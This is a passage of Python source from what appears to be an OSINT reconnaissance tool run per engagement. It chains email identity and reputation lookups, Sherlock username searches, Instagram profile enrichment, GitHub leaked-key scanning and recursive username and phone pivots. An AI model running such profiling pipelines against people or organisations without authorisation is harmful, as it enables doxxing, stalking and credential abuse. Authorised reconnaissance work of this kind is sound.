            )
            if len(prepared_email_schedule_aggregations) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.E email localpart promotion prep",
                    (
                        f"[dim]parallel parse x"
                        f"{min(parallel_workers, len(prepared_email_schedule_aggregations))}[/dim]"
                    ),
                )
            prepared_email_localpart_promotions = _run_inprocess_batch(
                prepared_email_schedule_aggregations,
                _prepare_email_localpart_promotion_item,
                max_workers=parallel_workers,
                progress_label=f"{iteration}.E email localpart promotion prep",
                progress_callback=_record_batch_progress,
            )
            if len(prepared_email_schedule_aggregations) > 1:
                _log(
                    f"{iteration}.E email aggregation merge",
                    "[dim]sequential dispatch x1[/dim]  [dim]dispatch accumulation order preserved[/dim]",
                )
            _run_inprocess_batch(
                prepared_email_schedule_aggregations,
                lambda item: _apply_email_schedule_aggregation_item(
                    item,
                    dispatch_specs_out=e_specs,
                    dispatch_spec_emails_out=e_spec_emails,
                    identity_lookup_specs_out=identity_lookup_specs,
                    identity_lookup_spec_emails_out=identity_lookup_spec_emails,
                    reputation_specs_out=reputation_specs,
                    reputation_spec_emails_out=reputation_spec_emails,
                ),
                max_workers=1,
                progress_label=f"{iteration}.E email aggregation merge",
                progress_callback=_record_batch_progress,
            )
            if len(prepared_email_localpart_promotions) > 1:
                _log(
                    f"{iteration}.E email localpart promotion",
                    "[dim]sequential dispatch x1[/dim]  [dim]SQLite promotion order preserved[/dim]",
                )
            applied_email_localpart_promotions = _run_inprocess_batch(
                prepared_email_localpart_promotions,
                lambda item: _apply_email_localpart_promotion(item, db_path_value=db_path),
                max_workers=1,
                progress_label=f"{iteration}.E email localpart promotion",
                progress_callback=_record_batch_progress,
            )
            if len(applied_email_localpart_promotions) > 1:
                _log(
                    f"{iteration}.E email localpart merge",
                    "[dim]sequential dispatch x1[/dim]  [dim]inferred-handle merge order preserved[/dim]",
                )
            _run_inprocess_batch(
                applied_email_localpart_promotions,
                lambda item: _apply_email_localpart_result_merge(
                    item,
                    inferred_by_email_out=inferred_by_email,
                    inferred_handles_out=inferred_handles,
                ),
                max_workers=1,
                progress_label=f"{iteration}.E email localpart merge",
                progress_callback=_record_batch_progress,
            )
            if len(e_specs) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.E email fan-out",
                    f"[dim]parallel dispatch x{min(parallel_workers, len(e_specs))}[/dim]",
                )
            e_returncodes = _run_module_batch(
                e_specs,
                _run_module,
                max_workers=parallel_workers,
                progress_label=f"{iteration}.E email fan-out",
                progress_callback=_record_batch_progress,
            )
            email_dispatch_pairs: list[tuple[str, int]] = []
            _run_ordered_inprocess_apply_batch(
                list(enumerate(e_returncodes)),
                lambda item: _apply_indexed_pair_item(
                    item,
                    leading_values=e_spec_emails,
                    pair_items_out=email_dispatch_pairs,
                ),
                progress_label=f"{iteration}.E email dispatch result apply",
                progress_callback=_record_batch_progress,
                order_note="email dispatch result order preserved",
            )
            if identity_lookup_specs:
                if len(identity_lookup_specs) > 1:
                    if identity_lookup_workers <= 1:
                        _log(
                            f"{iteration}.E direct identity providers",
                            "[dim]sequential dispatch x1[/dim]  [dim]direct-provider rate limit preserved[/dim]",
                        )
                    else:
                        _log(
                            f"{iteration}.E direct identity providers",
                            (
                                f"[dim]parallel dispatch x"
                                f"{min(identity_lookup_workers, len(identity_lookup_specs))}[/dim]"
                            ),
                        )
                identity_lookup_returncodes = _run_module_batch(
                    identity_lookup_specs,
                    _run_module,
                    max_workers=identity_lookup_workers,
                    progress_label=f"{iteration}.E direct identity providers",
                    progress_callback=_record_batch_progress,
                )
                _run_ordered_inprocess_apply_batch(
                    list(enumerate(identity_lookup_returncodes)),
                    lambda item: _apply_indexed_pair_item(
                        item,
                        leading_values=identity_lookup_spec_emails,
                        pair_items_out=email_dispatch_pairs,
                    ),
                    progress_label=f"{iteration}.E direct identity result apply",
                    progress_callback=_record_batch_progress,
                    order_note="direct identity result order preserved",
                )
            reputation_returncode_pairs: list[tuple[str, int]] = []
            if reputation_specs:
                if len(reputation_specs) > 1:
                    _log(
                        f"{iteration}.E email reputation",
                        "[dim]sequential dispatch x1[/dim]  [dim]EmailRep provider rate limit preserved[/dim]",
                    )
                reputation_returncodes = _run_module_batch(
                    reputation_specs,
                    _run_module,
                    max_workers=1,
                    progress_label=f"{iteration}.E email reputation",
                    progress_callback=_record_batch_progress,
                )
                _run_ordered_inprocess_apply_batch(
                    list(enumerate(reputation_returncodes)),
                    lambda item: _apply_indexed_pair_item(
                        item,
                        leading_values=reputation_spec_emails,
                        pair_items_out=reputation_returncode_pairs,
                    ),
                    progress_label=f"{iteration}.E email reputation result apply",
                    progress_callback=_record_batch_progress,
                    order_note="email reputation result order preserved",
                )
            if len(iter_email_batch) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.E email result prep",
                    f"[dim]parallel parse x{min(parallel_workers, len(iter_email_batch))}[/dim]",
                )
            prepared_email_chain_results = _run_inprocess_batch(
                iter_email_batch,
                lambda email: _prepare_email_chain_result(
                    email,
                    dispatch_pairs=email_dispatch_pairs,
                    reputation_pairs=reputation_returncode_pairs,
                    inferred_usernames=inferred_by_email.get(email, []),
                ),
                max_workers=parallel_workers,
                progress_label=f"{iteration}.E email result prep",
                progress_callback=_record_batch_progress,
            )
            if len(prepared_email_chain_results) > 1:
                _log(
                    f"{iteration}.E email finalize",
                    "[dim]sequential dispatch x1[/dim]  [dim]seed-run finalization order preserved[/dim]",
                )
            _run_inprocess_batch(
                prepared_email_chain_results,
                lambda item: _apply_email_chain_result(
                    item,
                    processed_emails_out=processed_emails,
                ),
                max_workers=1,
                progress_label=f"{iteration}.E email finalize",
                progress_callback=_record_batch_progress,
            )
            inferred_username_inputs = sorted(inferred_handles)
            if len(inferred_username_inputs) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.E inferred username processed-set prep",
                    (
                        f"[dim]parallel parse x"
                        f"{min(parallel_workers, len(inferred_username_inputs))}[/dim]"
                    ),
                )
            prepared_inferred_username_updates = _run_inprocess_batch(
                inferred_username_inputs,
                lambda item: _prepare_processed_set_item(
                    item,
                    normalizer=_normalize_username_value,
                ),
                max_workers=parallel_workers,
                progress_label=f"{iteration}.E inferred username processed-set prep",
                progress_callback=_record_batch_progress,
            )
            if len(prepared_inferred_username_updates) > 1:
                _log(
                    f"{iteration}.E inferred username processed-set update",
                    "[dim]sequential dispatch x1[/dim]  [dim]processed-set update order preserved[/dim]",
                )
            _run_inprocess_batch(
                prepared_inferred_username_updates,
                lambda item: _apply_processed_set_item(
                    item,
                    processed_set=processed_username_seeds,
                ),
                max_workers=1,
                progress_label=f"{iteration}.E inferred username processed-set update",
                progress_callback=_record_batch_progress,
            )
        else:
            _emit_prepared_notice_log(
                f"{iteration}.E email fan-out",
                "[dim]no new emails this iteration[/dim]",
                progress_label_prefix=f"{iteration}.E email",
                notice_suffix="empty",
                order_note="empty email notice order preserved",
                max_workers=parallel_workers,
                progress_callback=_record_batch_progress,
            )

        # ─── Fan-out E5: usernames from social_profiles feed into Sherlock ─
        # Any handles populated by phone dork mining, name search, or
        # earlier Sherlock runs get re-scanned. Deduped via
        # processed_social_handles.
        social_handles = _load_new_social_handles(
            processed_social_handles,
            max_workers=parallel_workers,
            progress_label=f"{iteration}.E5 social-handle parse",
            progress_callback=_record_batch_progress,
        )
        if social_handles:
            social_handle_schedule_inputs = sorted(social_handles)
            if len(social_handle_schedule_inputs) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.E5 social-handle schedule reduction",
                    (
                        f"[dim]parallel parse x"
                        f"{min(parallel_workers, len(social_handle_schedule_inputs))}[/dim]"
                    ),
                )
            prepared_social_handle_schedule = _run_inprocess_batch(
                social_handle_schedule_inputs,
                _prepare_simple_schedule_reduction_entry,
                max_workers=parallel_workers,
                progress_label=f"{iteration}.E5 social-handle schedule reduction",
                progress_callback=_record_batch_progress,
            )
            if len(prepared_social_handle_schedule) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.E5 social-handle batch reduction",
                    (
                        f"[dim]parallel parse x"
                        f"{min(parallel_workers, len(prepared_social_handle_schedule))}[/dim]"
                    ),
                )
            prepared_social_handle_batch = _run_inprocess_batch(
                prepared_social_handle_schedule,
                _prepare_simple_batch_reduction_entry,
                max_workers=parallel_workers,
                progress_label=f"{iteration}.E5 social-handle batch reduction",
                progress_callback=_record_batch_progress,
            )
            social_handle_batch: list[str] = []
            _run_ordered_inprocess_apply_batch(
                prepared_social_handle_batch,
                lambda item: _apply_simple_limited_batch_item(
                    item,
                    batch_out=social_handle_batch,
                    limit=10,
                ),
                progress_label=f"{iteration}.E5 social-handle batch apply",
                progress_callback=_record_batch_progress,
                order_note="social-handle batch order preserved",
            )
            _log(f"{iteration}.E5 social-handle fan-out",
                 f"[green]{len(social_handles)} new handle(s) -> Sherlock[/green]")
            if len(social_handle_batch) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.E5 sherlock spec prep",
                    f"[dim]parallel parse x{min(parallel_workers, len(social_handle_batch))}[/dim]",
                )
            sherlock_specs = _run_inprocess_batch(
                social_handle_batch,
                lambda handle: ModuleDispatchSpec(
                    cmd_argv=[
                        "osint",
                        "usernames",
                        "--engagement",
                        engagement,
                        "--usernames",
                        handle,
                        "--backend",
                        "sherlock",
                    ],
                    label=f"{iteration}.E5 sherlock (@{handle})",
                    loop_name="fanout_e5_sherlock_social_handles",
                    seed_contexts=[
                        _seed_context(handle, "username", source="social_profile", depth=2, confidence=0.8)
                    ],
                    metadata={"iteration": iteration},
                ),
                max_workers=parallel_workers,
                progress_label=f"{iteration}.E5 sherlock spec prep",
                progress_callback=_record_batch_progress,
            )
            if len(sherlock_specs) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.E5 social-handle fan-out",
                    f"[dim]parallel dispatch x{min(parallel_workers, len(sherlock_specs))}[/dim]",
                )
            sherlock_returncodes = _run_module_batch(
                sherlock_specs,
                _run_module,
                max_workers=parallel_workers,
                progress_label=f"{iteration}.E5 social-handle fan-out",
                progress_callback=_record_batch_progress,
            )
            # ─── Fan-out E5.5: Instagram profile enrichment per handle ─
            # For each handle, try Instagram anonymous profile endpoint.
            # Rate-limited hard by IG (429) — non-fatal, silent MISS.
            instagram_handles = social_handle_batch[:5]
            if len(instagram_handles) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.E5.5 instagram spec prep",
                    f"[dim]parallel parse x{min(parallel_workers, len(instagram_handles))}[/dim]",
                )
            instagram_specs = _run_inprocess_batch(
                instagram_handles,
                lambda handle: ModuleDispatchSpec(
                    cmd_argv=["osint", "instagram", "--engagement", engagement, "--username", handle],
                    label=f"{iteration}.E5.5 instagram (@{handle})",
                    loop_name="fanout_e55_instagram",
                    seed_contexts=[
                        _seed_context(handle, "username", source="social_profile", depth=2, confidence=0.8)
                    ],
                    metadata={"iteration": iteration},
                ),
                max_workers=parallel_workers,
                progress_label=f"{iteration}.E5.5 instagram spec prep",
                progress_callback=_record_batch_progress,
            )
            if len(instagram_specs) > 1 and parallel_workers > 1:
                if identity_lookup_workers <= 1:
                    _log(
                        f"{iteration}.E5.5 instagram fan-out",
                        "[dim]sequential dispatch x1[/dim]  [dim]Instagram provider rate limit preserved[/dim]",
                    )
                else:
                    _log(
                        f"{iteration}.E5.5 instagram fan-out",
                        (
                            f"[dim]parallel dispatch x"
                            f"{min(identity_lookup_workers, len(instagram_specs))}[/dim]"
                        ),
                    )
            instagram_returncodes = _run_module_batch(
                instagram_specs,
                _run_module,
                max_workers=identity_lookup_workers,
                progress_label=f"{iteration}.E5.5 instagram fan-out",
                progress_callback=_record_batch_progress,
            )
            sherlock_returncode_pairs: list[tuple[str, int]] = []
            _run_ordered_inprocess_apply_batch(
                list(enumerate(sherlock_returncodes)),
                lambda item: _apply_indexed_pair_item(
                    item,
                    leading_values=social_handle_batch,
                    pair_items_out=sherlock_returncode_pairs,
                ),
                progress_label=f"{iteration}.E5 sherlock result apply",
                progress_callback=_record_batch_progress,
                order_note="Sherlock result order preserved",
            )
            instagram_returncode_pairs: list[tuple[str, int]] = []
            _run_ordered_inprocess_apply_batch(
                list(enumerate(instagram_returncodes)),
                lambda item: _apply_indexed_pair_item(
                    item,
                    leading_values=instagram_handles,
                    pair_items_out=instagram_returncode_pairs,
                ),
                progress_label=f"{iteration}.E5 instagram result apply",
                progress_callback=_record_batch_progress,
                order_note="Instagram result order preserved",
            )
            if len(social_handle_batch) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.E5 social-handle result prep",
                    f"[dim]parallel parse x{min(parallel_workers, len(social_handle_batch))}[/dim]",
                )
            prepared_social_handle_results = _run_inprocess_batch(
                social_handle_batch,
                lambda handle: _prepare_social_handle_chain_result(
                    handle,
                    sherlock_pairs=sherlock_returncode_pairs,
                    instagram_pairs=instagram_returncode_pairs,
                ),
                max_workers=parallel_workers,
                progress_label=f"{iteration}.E5 social-handle result prep",
                progress_callback=_record_batch_progress,
            )
            if len(prepared_social_handle_results) > 1:
                _log(
                    f"{iteration}.E5 social-handle finalize",
                    "[dim]sequential dispatch x1[/dim]  [dim]seed-run finalization order preserved[/dim]",
                )
            _run_inprocess_batch(
                prepared_social_handle_results,
                lambda item: _apply_social_handle_chain_result(
                    item,
                    processed_social_handles_out=processed_social_handles,
                ),
                max_workers=1,
                progress_label=f"{iteration}.E5 social-handle finalize",
                progress_callback=_record_batch_progress,
            )
            if len(social_handle_batch) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.E5 handled username processed-set prep",
                    (
                        f"[dim]parallel parse x"
                        f"{min(parallel_workers, len(social_handle_batch))}[/dim]"
                    ),
                )
            prepared_social_handle_username_updates = _run_inprocess_batch(
                social_handle_batch,
                lambda item: _prepare_processed_set_item(
                    item,
                    normalizer=_normalize_username_value,
                ),
                max_workers=parallel_workers,
                progress_label=f"{iteration}.E5 handled username processed-set prep",
                progress_callback=_record_batch_progress,
            )
            if len(prepared_social_handle_username_updates) > 1:
                _log(
                    f"{iteration}.E5 handled username processed-set update",
                    "[dim]sequential dispatch x1[/dim]  [dim]processed-set update order preserved[/dim]",
                )
            _run_inprocess_batch(
                prepared_social_handle_username_updates,
                lambda item: _apply_processed_set_item(
                    item,
                    processed_set=processed_username_seeds,
                ),
                max_workers=1,
                progress_label=f"{iteration}.E5 handled username processed-set update",
                progress_callback=_record_batch_progress,
            )

        # ─── Fan-out F: GitHub keyscan per iteration ──────────────────
        # Scans root domain + any GitHub orgs discovered from HTML mining.
        # Skipped entirely if --skip-keyscan; --dry-run-keyscan forces
        # pattern-match only (no live API calls).
        if not skip_keyscan:
            keyscan_targets: list[str] = list(root_domains)
            new_orgs = all_github_orgs - processed_github_orgs
            keyscan_org_inputs = sorted(new_orgs)
            if len(keyscan_org_inputs) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.F keyscan org batch reduction",
                    f"[dim]parallel parse x{min(parallel_workers, len(keyscan_org_inputs))}[/dim]",
                )
            prepared_keyscan_org_batch = _run_inprocess_batch(
                keyscan_org_inputs,
                _prepare_simple_batch_reduction_entry,
                max_workers=parallel_workers,
                progress_label=f"{iteration}.F keyscan org batch reduction",
                progress_callback=_record_batch_progress,
            )
            keyscan_org_batch: list[str] = []
            _run_ordered_inprocess_apply_batch(
                prepared_keyscan_org_batch,
                lambda item: _apply_simple_limited_batch_item(
                    item,
                    batch_out=keyscan_org_batch,
                    limit=5,
                ),
                progress_label=f"{iteration}.F keyscan org batch apply",
                progress_callback=_record_batch_progress,
                order_note="keyscan org batch order preserved",
            )
            if len(keyscan_org_batch) > 1:
                _log(
                    f"{iteration}.F keyscan org target merge",
                    "[dim]sequential dispatch x1[/dim]  [dim]target order preserved[/dim]",
                )
            _run_inprocess_batch(
                keyscan_org_batch,
                lambda item: _apply_keyscan_org_batch_item(
                    item,
                    keyscan_targets_out=keyscan_targets,
                ),
                max_workers=1,
                progress_label=f"{iteration}.F keyscan org target merge",
                progress_callback=_record_batch_progress,
            )
            if len(keyscan_org_batch) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.F keyscan org processed-set prep",
                    (
                        f"[dim]parallel parse x"
                        f"{min(parallel_workers, len(keyscan_org_batch))}[/dim]"
                    ),
                )
            prepared_keyscan_org_updates = _run_inprocess_batch(
                keyscan_org_batch,
                lambda item: _prepare_processed_set_item(
                    item,
                    normalizer=lambda value: value,
                ),
                max_workers=parallel_workers,
                progress_label=f"{iteration}.F keyscan org processed-set prep",
                progress_callback=_record_batch_progress,
            )
            if len(prepared_keyscan_org_updates) > 1:
                _log(
                    f"{iteration}.F keyscan org processed-set update",
                    "[dim]sequential dispatch x1[/dim]  [dim]processed-org order preserved[/dim]",
                )
            _run_inprocess_batch(
                prepared_keyscan_org_updates,
                lambda item: _apply_processed_set_item(
                    item,
                    processed_set=processed_github_orgs,
                ),
                max_workers=1,
                progress_label=f"{iteration}.F keyscan org processed-set update",
                progress_callback=_record_batch_progress,
            )
            if keyscan_targets and len(keyscan_targets) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.F keyscan target prep",
                    f"[dim]parallel parse x{min(parallel_workers, len(keyscan_targets))}[/dim]",
                )
            prepared_keyscan_targets = _run_inprocess_batch(
                keyscan_targets,
                lambda target: _prepare_keyscan_target(
                    target,
                    engagement_value=engagement,
                    processed_targets=processed_keyscan_targets,
                    dry_run_keyscan_value=dry_run_keyscan,
                ),
                max_workers=parallel_workers,
                progress_label=f"{iteration}.F keyscan target prep",
                progress_callback=_record_batch_progress,
            )
            target_reduction_progress_label = _derive_reduction_progress_label(
                f"{iteration}.F keyscan target prep"
            )
            if target_reduction_progress_label and len(prepared_keyscan_targets) > 1 and parallel_workers > 1:
                _log(
                    target_reduction_progress_label,
                    f"[dim]parallel parse x{min(parallel_workers, len(prepared_keyscan_targets))}[/dim]",
                )
            reduced_prepared_keyscan_targets = _run_inprocess_batch(
                prepared_keyscan_targets,
                _prepare_keyscan_target_reduction_item,
                max_workers=parallel_workers,
                progress_label=target_reduction_progress_label,
                progress_callback=_record_batch_progress,
            )
            if len(reduced_prepared_keyscan_targets) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.F keyscan target dedupe prep",
                    (
                        f"[dim]parallel parse x"
                        f"{min(parallel_workers, len(reduced_prepared_keyscan_targets))}[/dim]"
                    ),
                )
            prepared_keyscan_target_dedupe_items = _run_inprocess_batch(
                reduced_prepared_keyscan_targets,
                _prepare_keyscan_target_dedupe_item,
                max_workers=parallel_workers,
                progress_label=f"{iteration}.F keyscan target dedupe prep",
                progress_callback=_record_batch_progress,
            )
            seen_keyscan_targets: set[str] = set()
            if len(prepared_keyscan_target_dedupe_items) > 1:
                _log(
                    f"{iteration}.F keyscan target dedupe",
                    "[dim]sequential dispatch x1[/dim]  [dim]first-occurrence order preserved[/dim]",
                )
            deduped_prepared_keyscan_targets = _run_inprocess_batch(
                prepared_keyscan_target_dedupe_items,
                lambda item: _apply_keyscan_target_dedupe_item(
                    item,
                    seen_targets=seen_keyscan_targets,
                ),
                max_workers=1,
                progress_label=f"{iteration}.F keyscan target dedupe",
                progress_callback=_record_batch_progress,
            )
            unique_prepared_keyscan_targets: list[dict[str, object]] = []
            _run_ordered_inprocess_apply_batch(
                deduped_prepared_keyscan_targets,
                lambda item: _apply_keyscan_target_collection_item(
                    item,
                    unique_targets_out=unique_prepared_keyscan_targets,
                ),
                progress_label=f"{iteration}.F keyscan target apply",
                progress_callback=_record_batch_progress,
                order_note="deduped target order preserved",
            )
            keyscan_specs: list[ModuleDispatchSpec] = []
            scheduled_keyscan_targets: list[str] = []
            if len(unique_prepared_keyscan_targets) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.F keyscan spec prep",
                    f"[dim]parallel parse x{min(parallel_workers, len(unique_prepared_keyscan_targets))}[/dim]",
                )
            prepared_keyscan_specs = _run_inprocess_batch(
                unique_prepared_keyscan_targets,
                lambda item: {
                    "target": str(item["target"]),
                    "already_processed": bool(item.get("already_processed")),
                    "spec": (
                        None
                        if bool(item.get("already_processed"))
                        else ModuleDispatchSpec(
                            cmd_argv=list(item["cmd_argv"]),
                            label=f"{iteration}.F keyscan ({str(item['target'])})",
                            loop_name="fanout_f_keyscan",
                            seed_contexts=[
                                _seed_context(
                                    str(item["target"]),
                                    str(item["seed_type"]),
                                    source="keyscan_target",
                                    depth=1,
                                    confidence=0.75,
                                )
                            ],
                            metadata={"iteration": iteration},
                        )
                    ),
                },
                max_workers=parallel_workers,
                progress_label=f"{iteration}.F keyscan spec prep",
                progress_callback=_record_batch_progress,
            )
            if len(prepared_keyscan_specs) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.F keyscan schedule prep",
                    f"[dim]parallel parse x{min(parallel_workers, len(prepared_keyscan_specs))}[/dim]",
                )
            scheduled_keyscan_entries = _run_inprocess_batch(
                prepared_keyscan_specs,
                lambda item: {
                    "target": str(item["target"]),
                    "already_processed": bool(item["already_processed"]),
                    "spec": item["spec"],
                },
                max_workers=parallel_workers,
                progress_label=f"{iteration}.F keyscan schedule prep",
                progress_callback=_record_batch_progress,
            )
            if len(scheduled_keyscan_entries) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.F keyscan schedule reduction",
                    f"[dim]parallel parse x{min(parallel_workers, len(scheduled_keyscan_entries))}[/dim]",
                )
            prepared_keyscan_schedule_reductions = _run_inprocess_batch(
                scheduled_keyscan_entries,
                _prepare_keyscan_schedule_reduction,
                max_workers=parallel_workers,
                progress_label=f"{iteration}.F keyscan schedule reduction",
                progress_callback=_record_batch_progress,
            )
            if len(prepared_keyscan_schedule_reductions) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.F keyscan schedule aggregation",
                    (
                        f"[dim]parallel parse x"
                        f"{min(parallel_workers, len(prepared_keyscan_schedule_reductions))}[/dim]"
                    ),
                )
            prepared_keyscan_schedule_aggregations = _run_inprocess_batch(
                prepared_keyscan_schedule_reductions,
                _prepare_keyscan_schedule_aggregation_item,
                max_workers=parallel_workers,
                progress_label=f"{iteration}.F keyscan schedule aggregation",
                progress_callback=_record_batch_progress,
            )
            if len(prepared_keyscan_schedule_aggregations) > 1:
                _log(
                    f"{iteration}.F keyscan schedule merge",
                    "[dim]sequential dispatch x1[/dim]  [dim]skip-log/spec accumulation order preserved[/dim]",
                )
            _run_inprocess_batch(
                prepared_keyscan_schedule_aggregations,
                lambda item: _apply_keyscan_schedule_aggregation_item(
                    item,
                    keyscan_specs_out=keyscan_specs,
                    scheduled_targets_out=scheduled_keyscan_targets,
                ),
                max_workers=1,
                progress_label=f"{iteration}.F keyscan schedule merge",
                progress_callback=_record_batch_progress,
            )
            if len(keyscan_specs) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.F keyscan",
                    f"[dim]parallel dispatch x{min(parallel_workers, len(keyscan_specs))}[/dim]",
                )
            if keyscan_specs:
                _run_module_batch(
                    keyscan_specs,
                    _run_module,
                    max_workers=parallel_workers,
                    progress_label=f"{iteration}.F keyscan",
                    progress_callback=_record_batch_progress,
                )
                if len(scheduled_keyscan_targets) > 1 and parallel_workers > 1:
                    _log(
                        f"{iteration}.F keyscan processed-target prep",
                        (
                            f"[dim]parallel parse x"
                            f"{min(parallel_workers, len(scheduled_keyscan_targets))}[/dim]"
                        ),
                    )
                prepared_keyscan_processed_target_updates = _run_inprocess_batch(
                    scheduled_keyscan_targets,
                    lambda item: _prepare_processed_set_item(
                        item,
                        normalizer=_resume_normalize,
                    ),
                    max_workers=parallel_workers,
                    progress_label=f"{iteration}.F keyscan processed-target prep",
                    progress_callback=_record_batch_progress,
                )
                if len(prepared_keyscan_processed_target_updates) > 1:
                    _log(
                        f"{iteration}.F keyscan processed-target update",
                        "[dim]sequential dispatch x1[/dim]  [dim]processed-target order preserved[/dim]",
                    )
                _run_inprocess_batch(
                    prepared_keyscan_processed_target_updates,
                    lambda item: _apply_processed_set_item(
                        item,
                        processed_set=processed_keyscan_targets,
                    ),
                    max_workers=1,
                    progress_label=f"{iteration}.F keyscan processed-target update",
                    progress_callback=_record_batch_progress,
                )
        else:
            _emit_prepared_notice_log(
                f"{iteration}.F keyscan",
                "[dim]skipped by --skip-keyscan[/dim]",
                progress_label_prefix=f"{iteration}.F keyscan",
                notice_suffix="skip",
                order_note="skip-keyscan notice order preserved",
                max_workers=parallel_workers,
                progress_callback=_record_batch_progress,
            )

        # ─── Fan-out K: username-seed recursive invocation ────────────
        # Runs on operator-provided username seeds and any newly promoted
        # username pivots that haven't already been enumerated through the
        # email-localpart or social-handle branches.
        prioritized_username_rows = _load_prioritized_seed_rows(
            "username",
            processed_username_seeds,
            normalizer=_normalize_username_value,
            max_workers=parallel_workers,
            progress_label=f"{iteration}.K username seed load prep",
            progress_callback=_record_batch_progress,
        )
        if prioritized_username_rows:
            if len(prioritized_username_rows) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.K username schedule prep",
                    f"[dim]parallel parse x{min(parallel_workers, len(prioritized_username_rows))}[/dim]",
                )
            scheduled_username_rows = _run_inprocess_batch(
                prioritized_username_rows,
                lambda item: {
                    "seed_value": str(item[0]),
                    "is_shallow": int(item[1] or 0) <= 1,
                },
                max_workers=parallel_workers,
                progress_label=f"{iteration}.K username schedule prep",
                progress_callback=_record_batch_progress,
            )
            if len(scheduled_username_rows) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.K username schedule reduction",
                    f"[dim]parallel parse x{min(parallel_workers, len(scheduled_username_rows))}[/dim]",
                )
            prepared_username_schedule = _run_inprocess_batch(
                scheduled_username_rows,
                _prepare_username_schedule_reduction,
                max_workers=parallel_workers,
                progress_label=f"{iteration}.K username schedule reduction",
                progress_callback=_record_batch_progress,
            )
            if len(prepared_username_schedule) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.K username batch reduction",
                    f"[dim]parallel parse x{min(parallel_workers, len(prepared_username_schedule))}[/dim]",
                )
            prepared_username_batch_entries = _run_inprocess_batch(
                prepared_username_schedule,
                _prepare_prioritized_batch_entry,
                max_workers=parallel_workers,
                progress_label=f"{iteration}.K username batch reduction",
                progress_callback=_record_batch_progress,
            )
            shallow_username_batch: list[str] = []
            deeper_username_batch: list[str] = []
            _run_ordered_inprocess_apply_batch(
                prepared_username_batch_entries,
                lambda item: _apply_prioritized_batch_entry_item(
                    item,
                    shallow_entries_out=shallow_username_batch,
                    deeper_entries_out=deeper_username_batch,
                ),
                progress_label=f"{iteration}.K username batch apply",
                progress_callback=_record_batch_progress,
                order_note="prioritized username batch order preserved",
            )
            username_batch = shallow_username_batch + deeper_username_batch[
                : max(0, 10 - len(shallow_username_batch))
            ]
            if len(username_batch) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.K username spec prep",
                    f"[dim]parallel parse x{min(parallel_workers, len(username_batch))}[/dim]",
                )
            username_specs = _run_inprocess_batch(
                username_batch,
                lambda username_seed: ModuleDispatchSpec(
                    cmd_argv=[
                        "osint",
                        "usernames",
                        "--engagement",
                        engagement,
                        "--usernames",
                        username_seed.lstrip("@"),
                        "--backend",
                        "sherlock",
                    ],
                    label=f"{iteration}.K username fan-out ({username_seed.lstrip('@')})",
                    loop_name="fanout_k_seed_username",
                    seed_contexts=[
                        _seed_context(
                            username_seed,
                            "username",
                            source="discovered",
                            confidence=0.9,
                        )
                    ],
                    metadata={"iteration": iteration},
                ),
                max_workers=parallel_workers,
                progress_label=f"{iteration}.K username spec prep",
                progress_callback=_record_batch_progress,
            )
            if len(username_specs) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.K username fan-out",
                    f"[dim]parallel dispatch x{min(parallel_workers, len(username_specs))}[/dim]",
                )
            _run_module_batch(
                username_specs,
                _run_module,
                max_workers=parallel_workers,
                progress_label=f"{iteration}.K username fan-out",
                progress_callback=_record_batch_progress,
            )
            if len(username_batch) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.K username processed-seed prep",
                    (
                        f"[dim]parallel parse x"
                        f"{min(parallel_workers, len(username_batch))}[/dim]"
                    ),
                )
            prepared_username_updates = _run_inprocess_batch(
                username_batch,
                lambda item: _prepare_processed_set_item(
                    item,
                    normalizer=_normalize_username_value,
                ),
                max_workers=parallel_workers,
                progress_label=f"{iteration}.K username processed-seed prep",
                progress_callback=_record_batch_progress,
            )
            if len(prepared_username_updates) > 1:
                _log(
                    f"{iteration}.K username processed-seed update",
                    "[dim]sequential dispatch x1[/dim]  [dim]processed-seed order preserved[/dim]",
                )
            _run_inprocess_batch(
                prepared_username_updates,
                lambda item: _apply_processed_set_item(
                    item,
                    processed_set=processed_username_seeds,
                ),
                max_workers=1,
                progress_label=f"{iteration}.K username processed-seed update",
                progress_callback=_record_batch_progress,
            )
        elif iteration == 1 and (seed_type == "username" or extra_username_seeds):
            _emit_no_pending_resume_skip_log(
                f"{iteration}.K username fan-out",
                "[dim]resume skip — no pending username seeds[/dim]",
                progress_label_prefix=f"{iteration}.K username",
                max_workers=parallel_workers,
                progress_callback=_record_batch_progress,
            )

        # ─── Fan-out L: phone-seed recursive invocation ───────────────
        # Runs on operator-provided phone seeds and any newly-synthesised
        # phone pivots discovered later in the loop.
        pending_phone_seeds = _load_new_seed_values(
            "phone",
            processed_phone_seeds,
            max_workers=parallel_workers,
            progress_label=f"{iteration}.L phone seed load prep",
            progress_callback=_record_batch_progress,
        )
        if pending_phone_seeds:
            phone_schedule_inputs = sorted(pending_phone_seeds)
            if len(phone_schedule_inputs) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.L phone schedule prep",
                    f"[dim]parallel parse x{min(parallel_workers, len(phone_schedule_inputs))}[/dim]",
                )
            scheduled_phone_entries = _run_inprocess_batch(
                phone_schedule_inputs,
                lambda phone_seed: str(phone_seed),
                max_workers=parallel_workers,
                progress_label=f"{iteration}.L phone schedule prep",
